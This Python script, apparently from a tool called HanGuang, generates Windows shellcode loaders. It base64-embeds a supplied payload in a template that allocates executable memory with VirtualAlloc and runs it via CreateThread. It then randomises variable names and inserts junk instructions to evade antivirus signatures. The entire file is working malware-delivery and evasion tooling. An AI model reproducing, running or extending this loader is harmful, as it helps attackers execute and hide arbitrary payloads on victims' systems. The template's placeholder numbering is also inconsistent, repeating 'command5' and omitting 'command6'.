#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# @Time     : 2021/3/23 13:46 
# @Author   : ordar
# @File     : hanguang.py  
# @Project  : HanGuang
# @Python   : 3.7.5
import base64

from modle.autor import AUTOR
import sys

auto = AUTOR()

make_shellcode = """
import ctypes,base64,time

command1

shellcode = base64.b64decode('flag_to_replace')

command2

shellcode = bytearray(shellcode)

command3

ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64

command4

ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))

command5

buffered = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)

command5

ctypes.windll.kernel32.RtlMoveMemory(
    ctypes.c_uint64(ptr), 
    buffered, 
    ctypes.c_int(len(shellcode))
)

command7

handle = ctypes.windll.kernel32.CreateThread(
    ctypes.c_int(0), 
    ctypes.c_int(0), 
    ctypes.c_uint64(ptr), 
    ctypes.c_int(0), 
    ctypes.c_int(0), 
    ctypes.pointer(ctypes.c_int(0))
)
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))
"""


# 使变量随机
def make_variable_random(shellcode):
    shellcode = shellcode.replace("shellcode", auto.random.auto_random_word(min_length=5, max_length=10, first_str_no_num=True))
    shellcode = shellcode.replace("ptr", auto.random.auto_random_word(min_length=5, max_length=10, first_str_no_num=True))
    shellcode = shellcode.replace("buffered", auto.random.auto_random_word(min_length=5, max_length=10, first_str_no_num=True))
    return shellcode

# 使指令随机-花指令
def make_command_random(shellcode):
    shellcode = shellcode.replace("command1", auto.random.auto_random_void_command())
    shellcode = shellcode.replace("command2", auto.random.auto_random_void_command())
    shellcode = shellcode.replace("command3", auto.random.auto_random_void_command())
    shellcode = shellcode.replace("command4", auto.random.auto_random_void_command())
    shellcode = shellcode.replace("command5", auto.random.auto_random_void_command())
    shellcode = shellcode.replace("command6", auto.random.auto_random_void_command())
    shellcode = shellcode.replace("command7", auto.random.auto_random_void_command())
    return shellcode

def get_file_content(file_path):
    try:
        with open(file_path, 'rb') as f:
            return f.read()
    except:
        pass


if __name__ == '__main__':
    file_path = sys.argv[1]
    raw = get_file_content(file_path)
    raw_bs64 = base64.b64encode(raw)
    code = raw_bs64.decode()
    print(code)
    make_shellcode = make_shellcode.replace('flag_to_replace', code)
    make_shellcode = make_variable_random(make_shellcode)
    make_shellcode = make_command_random(make_shellcode)
    with open('shellcode.py', 'w') as shellfile:
        shellfile.write(make_shellcode)

